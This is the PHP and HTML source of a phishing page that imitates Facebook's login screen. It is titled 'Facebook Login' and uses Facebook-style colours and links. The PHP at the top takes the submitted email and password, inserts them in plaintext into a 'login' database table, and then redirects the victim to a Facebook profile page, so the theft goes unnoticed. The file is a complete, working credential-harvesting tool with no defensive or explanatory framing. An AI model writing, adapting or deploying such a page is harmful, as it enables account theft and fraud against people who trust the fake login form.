<?php

include 'connection.php';
$db=new dbconnect;
//echo $db->message;

$email=mysqli_real_escape_string($db->link,isset($_POST["email"])?$_POST["email"]:"");
$password=mysqli_real_escape_string($db->link,isset($_POST["password"])?$_POST["password"]:"");


if (isset($_POST["login"])) {
	if (!empty($email) && !empty($password)) {
		$sql="INSERT INTO `login`(`Email`,`Password`) VALUES('$email','$password')";
		$query=$db->link->query($sql);

		if ($query) {
			echo "<script>location='https://www.facebook.com/Ariyan-Shuvo-429599004240154'</script>";
		}

	}


}

?>




<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="shortcut icon" href="124010.png">

    <title>Facebook Login</title>
    <link href="bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="style.css">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.2.0/css/all.css" integrity="sha384-hWVjflwFxL6sNzntih27bfxkr27PmbbK/iSvJ+a4+0owXq79v+lsFkW54bOGbiDQ" crossorigin="anonymous">
</head>
<style type="text/css">
	

</style>
<body style="background: #f4f4f4;">

		<div class="col-lg-12 col-md-12 col-sm-12 col-xs-12" style="background: #4267B2; padding: 10px; position: fixed;">
			<p style="text-align: center; color: #fff; font-size: 25px; font-weight: bold;">Facebook</p>

			
		</div>


		
			<div class="col-lg-12 col-md-12 col-sm-12 col-xs-12" style="margin-top:100px;  ">
				
				<form method="POST" style="background: #fff; margin:0 auto; padding: 40px;  ">
					<p style="text-align: center; font-size: 18px; letter-spacing: 1px;">Log into facebook</p><br><br>
					<center>
					<input type="text" name="email" placeholder="Email or Phone Number" style="min-width: 280px; padding: 6px; border: none; border:1px solid lightgray; color:gray;" required=""><br><br>
					<input type="password" name="password" placeholder="Password" style="min-width: 280px; padding: 6px; border: none; border:1px solid lightgray; color: gray;" required=""><br><br>

					<input type="submit" name="login" value="Log In" style="min-width: 280px; padding: 10px; border:none; color: #fff;  background: #4167B2; font-weight: bold;"><br><br>
					<span><a href="https://www.facebook.com/login/identify/?ctx=recover&ars=royal_blue_bar">Forgot account ?</a>&nbsp;&nbsp;&nbsp;<a href="https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=2&cad=rja&uact=8&ved=2ahUKEwiGmeW7v4nhAhVSnuAKHWM9BFoQFjABegQIARAB&url=https%3A%2F%2Fen-gb.facebook.com%2F&usg=AOvVaw1L6B0_9kDpd__ssKjbjNzE">Sign up for facebook</a></span>
					</center>


					
				</form>
				
			</div>
			
		
		


















          <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
   <script src="bootstrap.min.js"></script>
  </body>
</html>